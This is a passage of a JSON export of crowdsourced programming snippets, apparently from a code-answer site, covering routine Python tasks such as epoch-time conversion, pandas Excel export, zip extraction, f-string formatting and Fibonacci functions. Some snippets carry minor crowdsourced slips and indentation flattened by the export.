    "description": "datetime_time = datetime.datetime.fromtimestamp(epoch_time)\n>>> import datetime >>> datetime.datetime.fromtimestamp(1347517370).strftime('%Y-%m-%d %H:%M:%S') '2012-09-13 14:22:50' # Local time \n>>> import datetime >>> datetime.datetime.utcfromtimestamp(1347517370).strftime('%Y-%m-%d %H:%M:%S')   '2012-09-13 06:22:50' # utc time\n>>> datetime.datetime(2012,4,1,0,0).timestamp() 1333234800.0 \n>>> datetime.datetime.fromtimestamp(1284286794) datetime.datetime(2010, 9, 12, 11, 19, 54)\n",
    "reg_date": "2021-10-12T11:29:14.000Z"
  },
  {
    "id": 1023,
    "keyword": null,
    "link": null,
    "title": " epoch to datetime utc python",
    "description": ">>> import datetime >>> datetime.datetime.utcfromtimestamp(1347517370).strftime('%Y-%m-%d %H:%M:%S')   '2012-09-13 06:22:50' # utc time\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1024,
    "keyword": null,
    "link": null,
    "title": " erreur install pyaudio",
    "description": "For python 3.9 or old :    install with link https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio      find whl and install it with :  pip install PyAudio-0.2.11-cp39-cp39m-win_amd64.whl \n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1025,
    "keyword": null,
    "link": null,
    "title": " error: command 'x86 64-linux-gnu-g++' failed with exit status 1   ----------------------------------------   ERROR: Failed building wheel for OpenEXR",
    "description": "with Python 3, you'll need  sudo apt-get install python3 python-dev python3-dev \\      build-essential libssl-dev libffi-dev \\      libxml2-dev libxslt1-dev zlib1g-dev \\      python-pip  with Python 2, you'll need  sudo apt-get install python-dev  \\      build-essential libssl-dev libffi-dev \\      libxml2-dev libxslt1-dev zlib1g-dev \\      python-pip\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1026,
    "keyword": null,
    "link": null,
    "title": " error bar plot python",
    "description": "x = [0,1,2,3,4,5] y = [3,2,4,5,1,5] yerr=[0.3,0.2,0.4,0.5,0.1,0.5] fig, ax = plt.subplots(figsize=(8,8)) ax.errorbar(x, y, yerr=yerr, fmt='-o', color='k') ax.set_title('My title') ax.set_ylabel('My ylabel') ax.set_xlabel('My xlabel') plt.show()\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1027,
    "keyword": null,
    "link": null,
    "title": " error showing : unable to locate package python on Termux",
    "description": "error showing : unable to locate package python on Termux\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1028,
    "keyword": null,
    "link": null,
    "title": " error urllib request no attribute",
    "description": "import urllib.request\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1029,
    "keyword": null,
    "link": null,
    "title": " errors in discord.py",
    "description": "# This will be a quick example of how to handle errors in discord.py  import discord from discord.ext import commands # make sure to import these ^  # Let's say we have a kick command @client.command() @commands.has_any_role('Admin')  async def kick(ctx, member : discord.Member, *, reason=None):     await member.kick(reason=reason)     await ctx.send(''' Kicked user: {} Reason: {}'''.format(member, reason))      # Okay, so it works. But what if someone does !kick without the arguments # We will get an error. So let's handle that.  # I will show 2 ways   # Here is the first one.  # This way will handle EVERY missing arguments error @client.event async def on_command_error(ctx, error):        if isinstance(error, commands.MissingRequiredArgument):         await ctx.send('Make sure you put the required arguments.')         # Now, if someone uses any command and doesn't put the         # Required arguments, then this event will occur           # Here is the second one # This way will handle one command's error  @kick.error async def kick_error(ctx, error):   if isinstance(error, commands.MissingRequiredArgument):     await ctx.send('To use the kick command do: !kick <member>')     # Using this method we can account for all our commands individually      # I recommend using this method, however both methods work basically the same     # For example if we had a ban command, we could do the same      # Doing @ban.error and accounting for that one as well!\nCHECK OUT 'https://realpython.com/lessons/handling-exceptions/'\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1030,
    "keyword": null,
    "link": null,
    "title": " esp32 micropython timer",
    "description": "from machine import Timer tim0 = Timer(0)  def my_callback_function(timer):\t# important (timer) \t# do something  tim0.init(period = 1000, mode = Timer.ONE_SHOT, callback = my_callback_function) # other mode : Timer.PERIODIC  tim0.deinit() # stop timer\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1031,
    "keyword": null,
    "link": null,
    "title": " euclidean distance python",
    "description": "import numpy as np a = np.array((1,1,1)) b = np.array((2,2,2)) dist = np.linalg.norm(a-b) \n# Use numpy.linalg.norm: import numpy as np  a = np.array([1.0, 3.5, -6.3]) b = np.array([4.5, 1.6,  1.2])  dist = np.linalg.norm(a-b)\n# I hope to be of help and to have understood the request from math import sqrt # import square root from the math module # the x and y coordinates are the points on the Cartesian plane pointA = (x, y) # first point pointB = (x, y) # second point distance = calc_distance(pointA, pointB) # here your beautiful result def calc_distance(p1, p2): # simple function, I hope you are more comfortable   return sqrt((p1[0]-p2[0])**2+(p1[1]-p2[1])**2) # Pythagorean theorem\ndist = numpy.linalg.norm(a-b) \n # Python code to find Euclidean distance  # using sum() and square()     import numpy as np     # intializing points in  # numpy arrays  point1 = np.array((1, 2, 3))  point2 = np.array((1, 1, 1))     # finding sum of squares  sum_sq = np.sum(np.square(point1 - point2))     # Doing squareroot and  # printing Euclidean distance  print(np.sqrt(sum_sq))  \n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1032,
    "keyword": null,
    "link": null,
    "title": " example of a deep copy in python",
    "description": "# deep copy example in python import copy  old_list = [[1, 1, 1], [2, 2, 2], [3, 3, 3]] new_list = copy.deepcopy(old_list)  old_list[1][0] = 'BB'  print(\"Old list:\", old_list) print(\"New list:\", new_list)  # OUTPUT Old list: [[1, 1, 1], ['BB', 2, 2], [3, 3, 3]] New list: [[1, 1, 1], [2, 2, 2], [3, 3, 3]]\n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1033,
    "keyword": null,
    "link": null,
    "title": " example of input int questions in python with if statement",
    "description": "print \"Enter quantity\" quantity = input() if quantity*100 > 1000:   print \"Cost is\",((quantity*100)-(.1*quantity*100)) else:   print \"Cost is\",quantity*100 \n",
    "reg_date": "2021-10-12T11:29:15.000Z"
  },
  {
    "id": 1034,
    "keyword": null,
    "link": null,
    "title": " exception get line number python",
    "description": "import traceback  try:     print(4/0) except ZeroDivisionError:     print(traceback.format_exc()) \nimport sys, os  try:     raise NotImplementedError(\"No error\") except Exception as e:     exc_type, exc_obj, exc_tb = sys.exc_info()     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]     print(exc_type, fname, exc_tb.tb_lineno)\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1035,
    "keyword": null,
    "link": null,
    "title": " exception pyton print",
    "description": "except Exception as e: print(e)\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1036,
    "keyword": null,
    "link": null,
    "title": " exclude index column pandas",
    "description": "df.read_csv(filename, index=False)  \n df.to_csv(filename, index=False) \n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1037,
    "keyword": null,
    "link": null,
    "title": " executing shell commands from python script",
    "description": "import subprocess subprocess.run([\"bash\", \"testShell.sh\"]) #we don't have to give full path to the shell script. It always execute from the current directory  #As a rule of thumb, you need to separate the arguments based on space,  #for example ls -alh would be [\"ls\", \"-alh\"], while ls -a -l -h,  #would be [\"ls\", \"-a\", -\"l\", \"-h\"]. As another example,  #echo hello world would be [\"echo\", \"hello\", \"world\"],  #whereas echo \"hello world\" or echo hello\\ world would  #be [\"echo\", \"hello world\"].  #Another example. list_files = subprocess.run([\"ls\", \"-l\"]) print(\"The exit code was: %d\" % list_files.returncode)\nimport os  os.system(\"ma Commande\")  #Exemple:  os.system(\"cd Documents\")\nimport subprocess subprocess.call([\"./shell.sh\"])  # Make sure that \"shell.sh\" has \"+x\" permissions\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1038,
    "keyword": null,
    "link": null,
    "title": " exemple python gradient",
    "description": "import numpy as np\nimport numpy as np  class Model():     def __call__(self, x):         return 2 * (2 * x ** 2 - 10) * 4 * x alpha = 0.005 x = 5.0 norme_epsilon= 100 seuil_epsilon = 0.001 ma_fonction = Model() while norme_epsilon > seuil_epsilon:     dfx_dx = ma_fonction(x)     norme_epsilon = np.abs(dfx_dx)     x = x - alpha * dfx_dx     print(x) \nclass Model():\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1039,
    "keyword": null,
    "link": null,
    "title": " exit py console",
    "description": "exit()\nCtrl+d or exit()\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1040,
    "keyword": null,
    "link": null,
    "title": " exit python script",
    "description": "import sys sys.exit()\nimport sys  sys.exit()\n#Exit everywhere with error message import sys sys.exit(\"Code not Pythonical\")  #Exit with a specific status import os os._exit()  #Exit in interpreter quit()  #Exit in Interpreter but more user friendly exit()\nimport sys msg = \"bye bye\" sys.exit(msg) # you can use it with out a msg\nimport sys sys.exit()\t//This will exit the python program\nreturn None\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1041,
    "keyword": null,
    "link": null,
    "title": " exit python terminal",
    "description": "exit()\nCtrl+d or exit()\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1042,
    "keyword": null,
    "link": null,
    "title": " expand all rows pandas",
    "description": "import pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000)\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1043,
    "keyword": null,
    "link": null,
    "title": " export PyTorch model in the ONNX Runtime format",
    "description": "dummy_input = torch.randn(1, 3, 224, 224, device='cuda') onnx_path =  \"./model.onnx\" torch.onnx.export(learn.model, dummy_input, onnx_path, verbose=False)  # The output will be the model written to a file called model.onnx.\n",
    "reg_date": "2021-10-12T11:29:16.000Z"
  },
  {
    "id": 1044,
    "keyword": null,
    "link": null,
    "title": " export a dataframe to excel pandas",
    "description": "#Python, pandas #To export a pandas dataframe into Excel  df.to_excel(r'Path where you want to store the exported excel file\\File Name.xlsx', index = False) \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1045,
    "keyword": null,
    "link": null,
    "title": " export dataset from python to csv",
    "description": "df.to_csv('out.csv')\ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv', index = False) \ndf.to_csv(file_name, sep='\\t')\ndf.to_csv(r'Path where you want to store the exported CSV file\\File Name.csv') \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1046,
    "keyword": null,
    "link": null,
    "title": " export excel file python",
    "description": "df.to_excel(r'Path where you want to store the exported excel file\\File Name.xlsx', index = False) \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1047,
    "keyword": null,
    "link": null,
    "title": " export multiple python pandas dataframe to single excel file",
    "description": "#1. Create a pandas excel writer instance and name the excel file xlwriter = pd.ExcelWriter('Customer_Details.xlsx') #NB: If you don't include a file path like 'C:\\Users\\Ron\\Desktop\\File_Name.xlsx' # It will save to your default folder, that is, #where the file you're reading from is located.  #2. Write each dataframe to a worksheet with a name dfName.to_excel(xlwriter, sheet_name = 'Name', index = False) dfAddress.to_excel(xlwriter, sheet_name = 'Address', index = False) dfContact.to_excel(xlwriter, sheet_name = 'Contact', index = False)  #3. Close the instance xlwriter.close()\n# Create a Pandas Excel writer using XlsxWriter as the engine. with pd.ExcelWriter('pandas_multiple.xlsx', engine='xlsxwriter') as writer:         # Write each dataframe to a different worksheet.     final_df.to_excel(writer, sheet_name='Sheet1')     df_unigrams.to_excel(writer, sheet_name='Sheet2')     df_bigrams.to_excel(writer, sheet_name='Sheet3') \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1048,
    "keyword": null,
    "link": null,
    "title": " export pandas dataframe as excel",
    "description": "df.to_excel(r'C:\\Users\\Ron\\Desktop\\File_Name.xlsx', index = False)  #if you omit the file path (must also omit 'r') and  #enter only file_name.xlsx, it will save to your default file location, # that is, where the file you're reading from is located.\n#Python, pandas #To export a pandas dataframe into Excel  df.to_excel(r'Path where you want to store the exported excel file\\File Name.xlsx', index = False) \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1049,
    "keyword": null,
    "link": null,
    "title": " export pythonpath linux",
    "description": "export PYTHONPATH=\"$PWD/code\"\nexport PYTHONPATH=\"${PYTHONPATH}:/my/other/path\"\n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1050,
    "keyword": null,
    "link": null,
    "title": " extend stack python",
    "description": "x = [1, 2, 3] x.extend([4, 5]) print (x) gives you: [1, 2, 3, 4, 5]\n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1051,
    "keyword": null,
    "link": null,
    "title": " extended euclidean python",
    "description": "def extendEuclidean(a, b, s1=1, s2=0, t1=0, t2=1):          if b:         r=a%b         return extendEuclidean(b, r, s2, s1-s2*(a//b), t2, t1-t2*(a//b))          return a, s1, t1\n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1052,
    "keyword": null,
    "link": null,
    "title": " extra window in tkinter",
    "description": "from tkinter import * from tkinter.ttk import *   master = Tk() def openNewWindow():     newWindow = Toplevel(master)     newWindow.title(\"New Window\")     newWindow.geometry(\"200x200\")     Label(newWindow,text =\"This is a new window\").pack() \n",
    "reg_date": "2021-10-12T11:29:17.000Z"
  },
  {
    "id": 1053,
    "keyword": null,
    "link": null,
    "title": " extract data from json file python",
    "description": "import json  with open('path_to_file/person.json') as f:   data = json.load(f)  print(data)\nimport json   # with json load  (file) info = open('data.json',) res = json.load(info) print(res) print(\"Datatype after deserialization : \" + str(type(res))) #>>> {'name': 'Dave', 'City': 'NY'} #>>> Datatype of the serialized JSON data : <class 'dict'>\nimport json  with open('data.json') as json_file:     data = json.load(json_file)     for p in data['people']:         print('Name: ' + p['name'])         print('Website: ' + p['website'])         print('From: ' + p['from'])         print('')\nwith open('distros.json', 'r') as f:     distros_dict = json.load(f)  for distro in distros_dict:     print(distro['Name'])\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1054,
    "keyword": null,
    "link": null,
    "title": " extract data from lichess python",
    "description": ">>> import lichess.api >>> >>> user = lichess.api.user('thibault') >>> print(user['perfs']['blitz']['rating']) 1617 \n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1055,
    "keyword": null,
    "link": null,
    "title": " extract domain name from url python",
    "description": "from urllib.parse import urlparse  domain = urlparse('http://www.example.test/foo/bar').netloc print(domain) # --> www.example.test\nfrom urllib.parse import urlparse domain = urlparse('https://supermavster.com').netloc\nurl_list = ['https://blog.hubspot.com/marketing/parts-url',             'https://www.almabetter.com/enrollments',             'https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.rename.html',             'https://www.programiz.com/python-programming/list'] \n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1056,
    "keyword": null,
    "link": null,
    "title": " extract first letter of column python",
    "description": "df['new_col'] = df['First'].astype(str).str[0] df  Out[29]:    First  Second new_col 0    123     234       1 1     22    4353       2 2     32     355       3 3    453     453       4 4     45     345       4 5    453     453       4 6     56      56       5\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1057,
    "keyword": null,
    "link": null,
    "title": " extract float from string python",
    "description": ">>> re.findall(r\"[-+]?\\d*\\.\\d+|\\d+\", \"Current Level: -13.2 db or 14.2 or 3\") ['-13.2', '14.2', '3']\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1058,
    "keyword": null,
    "link": null,
    "title": " extract images from mp4 python",
    "description": "import cv2 vidcap = cv2.VideoCapture('big_buck_bunny_720p_5mb.mp4') success,image = vidcap.read() count = 0 while success:   cv2.imwrite(\"frame%d.jpg\" % count, image)     # save frame as JPEG file         success,image = vidcap.read()   print('Read a new frame: ', success)   count += 1 \n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1059,
    "keyword": null,
    "link": null,
    "title": " extract text from pdf python",
    "description": "# using PyMuPDF import sys, fitz fname = sys.argv[1]  # get document filename doc = fitz.open(fname)  # open document out = open(fname + \".txt\", \"wb\")  # open text output for page in doc:  # iterate the document pages     text = page.get_text().encode(\"utf8\")  # get plain text (is in UTF-8)     out.write(text)  # write text of page     out.write(bytes((12,)))  # write page delimiter (form feed 0x0C) out.close()\n# pip install tika from tika import parser  raw = parser.from_file('yourfile.pdf') print(raw['content']) \nimport pdfplumber  with pdfplumber.open(r'example.pdf') as pdf:     first_page = pdf.pages[0]     print(first_page.extract_text())\nimport pdfplumberwith pdfplumber.open(r'D:\\examplepdf.pdf') as pdf:    first_page = pdf.pages[0]    print(first_page.extract_text())\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1060,
    "keyword": null,
    "link": null,
    "title": " extract year from datetime pandas",
    "description": "df['date'] = pd.to_datetime(df['date'],format='%Y%m%d') df['year'] = pd.DatetimeIndex(df['date']).year df['month'] = pd.DatetimeIndex(df['date']).month\n#Exctract month and create a dedicated column df[\"Month\"] from a  #column in datetime format df[\"Date\"] df['Month'] = pd.DatetimeIndex(df['Date']).month  \ndf['month_year'] = df['date_column'].dt.to_period('M') \n#if the date format comes in datetime, we can also extract the day/month/year using the to_period function #where 'D', 'M', 'Y' are inputs df['month_year'] = pd.to_datetime(df['birth_date']).dt.to_period('M') df.head() \n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1061,
    "keyword": null,
    "link": null,
    "title": " extract zip file python",
    "description": "import zipfile with zipfile.ZipFile(\"file.zip\",\"r\") as zip_ref:     zip_ref.extractall(\"targetdir\")\nimport zipfile with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:     zip_ref.extractall(directory_to_extract_to)\nurl = 'https://codeload.github.com/fogleman/Minecraft/zip/master'   # downloading with requests   # import the requests library import requests     # download the file contents in binary format r = requests.get(url)   # open method to open a file on your system and write the contents with open(\"minemaster1.zip\", \"wb\") as code:     code.write(r.content)     # downloading with urllib   # import the urllib library import urllib   # Copy a network object to a local file urllib.urlretrieve(url, \"minemaster.zip\") \nZipFile.extractall(path=None, members=None, pwd=None) \nimport os import optparse import zipfile  def get_arguments():     parser = optparse.OptionParser()     parser.add_option(\"--src\",\"--source\",dest=\"paths\", help=\"Removing file with extension .SRT and .VTT\")     (options,arguments)=parser.parse_args()     if not options.paths:         parser.error(\"[-] Please specify source, use --help for more info.\")     return options   def Source_folder(folder_path):     print('[+] Extracting zip file')     for path, dir_list, file_list in os.walk(folder_path):         try:             for file_name in file_list:                 if file_name.endswith(\".zip\"):                     abs_file_path = os.path.join(path, file_name)                     parent_path = os.path.split(abs_file_path)[0]                     output_folder_name = os.path.splitext(abs_file_path)[0]                     output_path = os.path.join(parent_path, output_folder_name)                      zip_obj = zipfile.ZipFile(abs_file_path, 'r')                     zip_obj.extractall(output_path)                     zip_obj.close()          except FileNotFoundError:             print('Error', file_name)   options = get_arguments() Source_folder(options.paths)\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1062,
    "keyword": null,
    "link": null,
    "title": " f-string ponto decimal python",
    "description": "valor_hora_trabalho = float(input(\"Valor por hora trabalhada: \")) horas_trabalhadas = float(input(\"Horas trabalhadas: \"))  salario  = valor_hora_trabalho * horas_trabalhadas  print(f\"Sal&aacute;rio do m&ecirc;s: R${salario:.2f}\")\n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1063,
    "keyword": null,
    "link": null,
    "title": " f string float format",
    "description": ">>> a = 10.1234 >>> f'{a:.2f}' '10.12'\nvalor_hora_trabalho = float(input(\"Valor por hora trabalhada: \")) horas_trabalhadas = float(input(\"Horas trabalhadas: \"))  salario  = valor_hora_trabalho * horas_trabalhadas  print(f\"Sal&aacute;rio do m&ecirc;s: R${salario:.2f}\")\n>>> a = 10.1234 >>> f'{a:.2f}' '10.12' \n#!/usr/bin/env python3  val = 12.3  print(f'{val:.2f}') print(f'{val:.5f}') \n#!/usr/bin/env python3  name = 'Peter' age = 23  print('%s is %d years old' % (name, age)) print('{} is {} years old'.format(name, age)) print(f'{name} is {age} years old') \n",
    "reg_date": "2021-10-12T11:29:18.000Z"
  },
  {
    "id": 1064,
    "keyword": null,
    "link": null,
    "title": " f string python not working in linux",
    "description": "F String does not work for python version below 3.6. If python version is below 3.6 use this instead of F string: print(\"Let's talk about {}.\".format(my_name))\n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1065,
    "keyword": null,
    "link": null,
    "title": " f string round",
    "description": "x = 3.14159265 print(f'pi = {x:.2f}')\n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1066,
    "keyword": null,
    "link": null,
    "title": " factorial of a number using recursion in python",
    "description": "# Factorial of a number using recursion  def recur_factorial(n):    if n == 1:        return n    else:        return n*recur_factorial(n-1)  num = 7  # check if the number is negative if num < 0:    print(\"Sorry, factorial does not exist for negative numbers\") elif num == 0:    print(\"The factorial of 0 is 1\") else:    print(\"The factorial of\", num, \"is\", recur_factorial(num)) \n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1067,
    "keyword": null,
    "link": null,
    "title": " factorial python for loop",
    "description": "#Factorial  '''factorial n! - n* n-1*n-2..1'''  def fac_iterative_method(n):     fac = 1     for i in range(n):         fac = (fac * (i+1))         print('fac of',i+1,'=',fac)          number = int(input('enter the number')) fac_iterative_method(number) \n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1068,
    "keyword": null,
    "link": null,
    "title": " factorial sequence code in python with while loops",
    "description": "num = int(input(\"enter a number: \"))   fac = 1 i = 1   while i <= num: fac = fac * i i = i + 1   print(\"factorial of \", num, \" is \", fac) \n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1069,
    "keyword": null,
    "link": null,
    "title": " factors addition in pyhone",
    "description": "def factor(num):   factor = [1]   for i in range(2,num+1):      if num%i==0:          factor.append(i)   return sum(factor)\nprint(factor(30)) \n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1070,
    "keyword": null,
    "link": null,
    "title": " falsy python",
    "description": "None False 0 0.0 0j Decimal(0) Fraction(0, 1) [] - an empty list {} - an empty dict () - an empty tuple '' - an empty str b'' - an empty bytes set() - an empty set an empty range, like range(0) objects for which obj.__bool__() returns False obj.__len__() returns 0\n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1071,
    "keyword": null,
    "link": null,
    "title": " fast outupt input python",
    "description": "import sys input = sys.stdin.readline # contributed by rohit gupta\n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1072,
    "keyword": null,
    "link": null,
    "title": " fastest way to output text file in python + Cout",
    "description": "import sys  print('This message will be displayed on the screen.')  original_stdout = sys.stdout # Save a reference to the original standard output  with open('filename.txt', 'w') as f:     sys.stdout = f # Change the standard output to the file we created.     print('This message will be written to a file.')     sys.stdout = original_stdout # Reset the standard output to its original value \n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1073,
    "keyword": null,
    "link": null,
    "title": " fatal error detected failed to execute script",
    "description": "#You probably have some files that your code needs to run properly. #Make sure the .exe file is in the same folder as those files it needs to run. #I had this problem and this video help me out: #https://www.youtube.com/watch?v=UZX5kH72Yx4&list=LLZS2n0tIPCVtKYM00KjsvKQ&index=3&t=328s #see min 4:16\n",
    "reg_date": "2021-10-12T11:29:19.000Z"
  },
  {
    "id": 1074,
    "keyword": null,
    "link": null,
    "title": " favicon django",
    "description": "<link rel=\"shortcut icon\" type=\"image/png\" href=\"{% static 'favicon.ico' %}\"/> \n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1075,
    "keyword": null,
    "link": null,
    "title": " feet to meter python",
    "description": "input1 = input('feet to meter or meter to feet? ')  if input1 == 'feet to meter':     feet = float(input('enter feet: '))     meter = feet *0.3048     print(meter)  if input1 == 'meter to feet':     meter = float(input('enter meter: '))     feet = meter/0.3048     print(feet) \n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1076,
    "keyword": null,
    "link": null,
    "title": " fetch row where column is equal to a value pandas",
    "description": "df.loc[df['column_name'] == 'value']\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1077,
    "keyword": null,
    "link": null,
    "title": " fibonacci",
    "description": "# WARNING: this program assumes the # fibonacci sequence starts at 1 def fib(num): \t\"\"\"return the number at index `num` in the fibonacci sequence\"\"\"     if num <= 2:         return 1     return fib(num - 1) + fib(num - 2)  # method 2: use `for` loop def fib2(num): \ta, b = 1, 1 \tfor _ in range(num - 1): \t\ta, b = b, a + b \treturn a   print(fib(6))  # 8 print(fib2(6))  # same result, but much faster\n# Easy fibonacci exercise # Method #1 def fibonacci(n):     # 1th: 0     # 2th: 1     # 3th: 1 ...     if n == 1:         return 0     elif n == 2:         return 1     else:         return fibonacci(n - 1) + fibonacci(n - 2)  # Method #2 def fibonacci2(n):     if n == 0: return 0     n1 = 1     n2 = 1     # (1, n - 2) because start by 1, 2, 3... not 0, 1, 1, 2, 3....     for i in range(1, n - 2):         n1 += n2         n2 = n1 - n2     return n1   print(fibonacci(13)) # return the nth element in the fibonacci sequence\nf(n) = f(n-1) + f(n-2)                                    f(6)                                    ^   \t\t\t                       /\\                 f(5)               +                       f(4)                 ^                /\\                   +                        /\\                          f(4)    +           f(3)                     f(3)    +    f(2)        ^                       ^                     ^              ^       /\\                       /\\                    /\\            /\\      f(3)   +       f(2)            f(2) +f(1)       f(2) + f(1)   f(1) +  f(0)                 ^              ^                ^                ^    /\\             /\\                /\\              /\\      f(2) + f(1)      f(1) +  f(0)     f(1)+ f(0)       f(1) + f(0)            ^   /\\ f(1) +  f(0)     //f(6) = 8   ==>  f(1)*8    f(1) appears 8 times   double feb  = (1/Math.pow(5,0.5)) * (Math.pow((1+Math.pow(5,0.5))/2,n)) - (1/Math.pow(5,0.5))* (Math.pow((1-Math.pow(5,0.5))/2,n));      f(1) == 1;                        \nimport java.util.Scanner; public class Fibonacci  {     public static void main(String[] args)      {         int n, a = 0, b = 0, c = 1;         Scanner s = new Scanner(System.in);         System.out.print(\"Enter value of n:\");         n = s.nextInt();         System.out.print(\"Fibonacci Series:\");         for(int i = 1; i <= n; i++)         {             a = b;             b = c;             c = a + b;             System.out.print(a+\" \");         }     } }\n// program to generate fibonacci series up to n terms  // take input from the user const number = parseInt(prompt('Enter the number of terms: ')); let n1 = 0, n2 = 1, nextTerm;  console.log('Fibonacci Series:');  for (let i = 1; i <= number; i++) {     console.log(n1);     nextTerm = n1 + n2;     n1 = n2;     n2 = nextTerm; }Copied\nEach test case will contains a single integer n where n >=1. \n                         fib(5)                         /                                  fib(4)                fib(3)                 /                      /               fib(3)      fib(2)         fib(2)    fib(1)         /             /           /         fib(2)   fib(1)  fib(1) fib(0) fib(1) fib(0)   /     fib(1) fib(0) \n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1078,
    "keyword": null,
    "link": null,
    "title": " fibonacci sequence python",
    "description": "# WARNING: this program assumes the # fibonacci sequence starts at 1 def fib(num): \t\"\"\"return the number at index `num` in the fibonacci sequence\"\"\"     if num <= 2:         return 1     return fib(num - 1) + fib(num - 2)  # method 2: use `for` loop def fib2(num): \ta, b = 1, 1 \tfor _ in range(num - 1): \t\ta, b = b, a + b \treturn a   print(fib(6))  # 8 print(fib2(6))  # same result, but much faster\n# Python program to display the Fibonacci sequence  def recur_fibo(n):    if n <= 1:        return n    else:        return(recur_fibo(n-1) + recur_fibo(n-2))  nterms = 10  # check if the number of terms is valid if nterms <= 0:    print(\"Plese enter a positive integer\") else:    print(\"Fibonacci sequence:\")    for i in range(nterms):        print(recur_fibo(i)) \n# WARNING: this program assumes the # fibonacci sequence starts at 1 def fib(num):   \"\"\"return the number at index num in the fibonacci sequence\"\"\"   if num <= 2:     return 1   return fib(num - 1) + fib(num - 2)   print(fib(6))  # 8\ndef fib(n):     a = 0     b = 1      print(a)         print(b)      for i in range(2, n):         print(a+b)         a, b = b, a + b  fib(7) #first seven nubers of Fibonacci sequence\nnum = 1 num1 = 0 num2 = 1 import time for i in range(0, 10):     print(num)     num = num1 + num2     num1 = num2     num2 = num     time.sleep(1) \n# This program also assumes the fibonacci sequence starts at 1  # This code will print as many digits as the user wishes # Instead of printing a specific number in the sequence  def fibonacci(digits):      digit1, digit2 = 1, 1     amount_of_digits = 0      print(str(digit1) + \", \" + str(digit2) + ', ', end='')      while amount_of_digits != digits:         digit1, digit2 = digit2, digit1 + digit2          print(str(digit2) + \", \", end='') # we want to print on the same line         amount_of_digits = amount_of_digits + 1           if amount_of_digits == digits:             print('\\n')              print('Loop done.')             break  fibonacci(10) # this will print the first 10 digits in the sequence\n#Learnprogramo Number = int(input(\"How many terms? \")) # first two terms First_Value, Second_Value = 0, 1 i = 0 if Number <= 0: print(\"Please enter a positive integer\") elif Number == 1: print(\"Fibonacci sequence upto\",Number,\":\") print(First_Value) else: print(\"Fibonacci sequence:\") while i < Number: print(First_Value) Next = First_Value + Second_Value # update values First_Value = Second_Value Second_Value = Next i += 1\n",
    "reg_date": "2021-10-12T11:29:20.000Z"
  },
  {
    "id": 1079,
    "keyword": null,
    "link": null,
    "title": " fibonacci series python recursion",
